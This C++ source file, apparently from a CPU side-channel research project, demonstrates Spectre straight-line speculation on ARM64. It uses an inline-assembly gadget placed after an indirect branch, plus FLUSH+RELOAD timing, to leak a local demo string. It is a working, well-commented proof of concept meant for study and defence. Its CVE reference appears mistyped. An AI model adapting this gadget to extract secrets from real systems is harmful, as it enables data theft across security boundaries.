/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

// Spectre SLS -- Straight-Line Speculation via indirect branch on ARM64.
//
// Demonstrates that after an unconditional indirect branch (BR instruction),
// the CPU may speculatively execute instructions placed immediately after the
// branch in memory ("straight-line"), before the branch target is resolved.
//
// This is related to CVE-2020-1384. The attack works as follows:
//
//   1. We place a "speculative gadget" (load secret + cache oracle access)
//      immediately after a BR instruction in memory.
//
//   2. The BR target address is loaded from a cache-missed memory location,
//      so the CPU cannot resolve the branch target immediately.
//
//   3. While waiting for the target address, the CPU fetches and speculatively
//      executes the instructions that follow the BR in program order -- the
//      straight-line path -- even though architecturally the BR will redirect
//      execution to a completely different location.
//
//   4. The speculatively executed gadget loads a secret byte and uses it to
//      index into a cache side-channel oracle (FLUSH+RELOAD).
//
//   5. When the BR target finally resolves, the speculative results are
//      discarded -- but the cache state persists as a side effect.
//
//   6. We measure cache access latencies to determine which oracle entry was
//      touched speculatively, recovering the secret byte.
//
// PLATFORM NOTES:
// This demo targets ARM64 (AArch64) only. It requires an out-of-order CPU
// that performs straight-line speculation after indirect branches. Results
// may vary across microarchitectures; some CPUs may require additional BTB
// (Branch Target Buffer) pressure to reliably trigger the speculation.

#include "compiler_specifics.h"

#if !SAFESIDE_ARM64
#  error Unsupported architecture. ARM64 required.
#endif

#include <array>
#include <cstring>
#include <iostream>

#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "utils.h"

// SafeTarget: the architectural destination of the indirect branch.
// This function is intentionally empty. When BR jumps here, the RET
// instruction uses x30 (link register), which still holds the return
// address to SlsGadget's caller. This means control returns correctly
// without any stack corruption, as long as SlsGadget is a leaf function
// (no stack frame of its own).
SAFESIDE_NEVER_INLINE
static void SafeTarget() {
  // Intentionally empty -- returns via x30 set by the original caller.
}

// Global function pointer: the branch target stored in memory.
// We flush this from cache before each BR so that loading the target
// address is slow (~100+ cycles), creating a window during which the
// CPU speculatively executes the straight-line gadget.
static void (*g_branch_target)(void) = SafeTarget;

// SlsGadget: the core of the SLS attack.
//
// Layout in memory:
//   LDR  x0, [g_branch_target]   ; load target (cache miss = slow)
//   BR   x0                      ; indirect branch to SafeTarget
//   LDRB w3, [secret_addr]       ; \
//   ADD  x3, oracle, x3, LSL 12  ;  >-- speculative payload
//   LDRB w3, [x3]                ; /
//
// Architecturally, BR redirects to SafeTarget which returns to the caller.
// Speculatively, the CPU executes the three payload instructions straight-line
// before the BR target is known, loading a secret byte into the cache oracle.
//
// This function must remain a leaf function (no calls, no stack frame) so that
// SafeTarget's RET can return directly to our caller with a clean stack.
SAFESIDE_NEVER_INLINE
static void SlsGadget(const char *secret_addr, const void *oracle_base) {
  asm volatile(
      // Load the branch target from memory. Because g_branch_target was
      // flushed from cache, this LDR stalls for ~100+ cycles.
      "ldr x0, %2\n"

      // Indirect branch. The CPU cannot resolve the target until the LDR
      // above completes, so it speculatively fetches and executes the
      // instructions that follow the BR in memory (straight-line).
      "br  x0\n"

      // === Straight-line speculation payload ===
      // These instructions are speculatively executed before BR resolves.

      // Load the secret byte from private_data into w3 (zero-extended to x3).
      "ldrb w3, [%0]\n"

      // Compute the oracle address: oracle_base + secret_byte * 4096.
      // Each oracle entry (BigByte) is 4096 bytes to avoid cache prefetching.
      "add  x3, %1, x3, lsl 12\n"

      // Touch the oracle entry -- this loads it into cache, creating a
      // microarchitectural side effect that survives speculation rollback.
      "ldrb w3, [x3]\n"
      :
      : "r"(secret_addr), "r"(oracle_base), "m"(g_branch_target)
      : "x0", "x3", "memory");
  // Architecturally unreachable -- BR jumps to SafeTarget.
}

// Leaks private_data[offset] via straight-line speculation after BR.
//
// For each run:
//   1. Flush the cache oracle (all 256 entries)
//   2. Flush g_branch_target from cache to delay BR resolution
//   3. Execute SlsGadget: BR to SafeTarget, but CPU speculates the payload
//   4. Measure oracle latencies to identify which entry was touched
//   5. Accumulate scores across runs until one byte dominates
static char LeakByte(size_t offset) {
  CacheSideChannel sidechannel;

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();

    // Flush the branch target pointer from cache. This makes the LDR in
    // SlsGadget slow, giving the CPU time to speculatively execute the
    // straight-line payload before the BR target address is known.
    FlushDataCacheLine(&g_branch_target);
    MemoryAndSpeculationBarrier();

    // Execute the SLS gadget.
    //   Architecturally: BR -> SafeTarget -> RET -> back to LeakByte.
    //   Speculatively:   secret byte loaded, oracle entry touched.
    SlsGadget(&private_data[offset], sidechannel.GetOracle().data());

    // The secret was only accessed speculatively -- there is no architectural
    // cache hit to use as a reference. AddHitAndRecomputeScores injects an
    // artificial architectural hit and checks which oracle entry was accessed.
    std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  for (size_t i = 0; i < strlen(private_data); ++i) {
    // Leak each byte of private_data. The only architectural memory accesses
    // are to valid bytes in public_data and local auxiliary structures --
    // private_data is never accessed in the C++ execution model.
    std::cout << LeakByte(i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
